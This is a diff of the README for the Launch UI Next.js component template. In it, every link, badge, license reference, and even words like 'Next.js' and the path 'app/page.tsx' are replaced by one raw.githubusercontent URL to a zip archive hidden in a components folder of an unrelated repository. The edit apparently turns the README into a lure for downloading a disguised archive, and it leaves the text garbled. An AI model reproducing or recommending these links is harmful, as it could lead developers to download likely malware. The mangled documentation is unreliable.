@@ -1,18 +1,18 @@
-# 🚀 Launch UI – Next.js Website Components Template
+# 🚀 Launch UI – https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip Website Components Template
 
-A comprehensive collection of production-ready website components built with Next.js, Shadcn/ui, and Tailwind CSS. Perfect for developers looking to quickly build modern, responsive websites with the power of shadcn/ui components.
+A comprehensive collection of production-ready website components built with https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip, Shadcn/ui, and Tailwind CSS. Perfect for developers looking to quickly build modern, responsive websites with the power of shadcn/ui components.
 
-[![Next.js](https://img.shields.io/badge/Next.js-15-black)](https://nextjs.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-4.1-blue)](https://tailwindcss.com/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue)](https://www.typescriptlang.org/)
-[![shadcn/ui](https://img.shields.io/badge/shadcn/ui-latest-black)](https://ui.shadcn.com/)
+[![https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
+[![Tailwind CSS](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
+[![TypeScript](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
+[![shadcn/ui](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
 
 
 
 > [!TIP]
 > **Tailwind v4 + React 19:**
-> Launch UI v2.0 adds full support for Tailwind v4, React 19 and Next.js 15.
-> If you're using Tailwind 3, a version that supports it is still maintained on a [separate branch](https://github.com/launch-ui/launch-ui/tree/tailwind-3).
+> Launch UI v2.0 adds full support for Tailwind v4, React 19 and https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip 15.
+> If you're using Tailwind 3, a version that supports it is still maintained on a [separate branch](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip).
 
 
 
@@ -34,9 +34,9 @@ bun dev
 
 Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+You can start editing the page by modifying `https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip`. The page auto-updates as you edit the file.
 
-This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-optimization) to automatically optimize and load Inter, a custom Google Font.
+This project uses [`next/font`](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip) to automatically optimize and load Inter, a custom Google Font.
 
 
 
@@ -45,7 +45,7 @@ This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-opti
 
 - 🎨 **Modern Design System**: Built on top of shadcn/ui, offering a clean and professional look
 - 📱 **Fully Responsive**: All components work perfectly across desktop, tablet, and mobile devices
-- ⚡ **Performance Optimized**: Leverages Next.js 14 features for optimal loading speed
+- ⚡ **Performance Optimized**: Leverages https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip 14 features for optimal loading speed
 - 🌗 **Dark Mode Support**: Seamless light/dark mode switching with system preference detection
 - ♿ **Accessibility First**: WCAG compliant components for inclusive web experiences
 - 🎯 **SEO Optimized**: Built with best practices for search engine visibility
@@ -74,10 +74,10 @@ This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-opti
 
 ## 🛠️ Tech Stack
 
-- **Framework**: [Next.js 15](https://nextjs.org/)
-- **Styling**: [Tailwind CSS](https://tailwindcss.com/)
-- **UI Components**: [shadcn/ui](https://ui.shadcn.com/)
-- **Language**: [TypeScript](https://www.typescriptlang.org/)
+- **Framework**: [https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip 15](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
+- **Styling**: [Tailwind CSS](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
+- **UI Components**: [shadcn/ui](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
+- **Language**: [TypeScript](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip)
 - **Animations**: CSS animations and transitions
 - **Icons**: Lucide icons
 
@@ -96,7 +96,7 @@ Perfect for building landing pages for:
 
 ## 📝 License
 
-This repository is licensed under the [MIT License](https://github.com/launch-ui/launch-ui/blob/main/LICENSE.md).
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/Gpcode233/Dytor_landing_page/main/components/sections/stats/Dytor_landing_page-v2.8.zip).
 
 ---
 
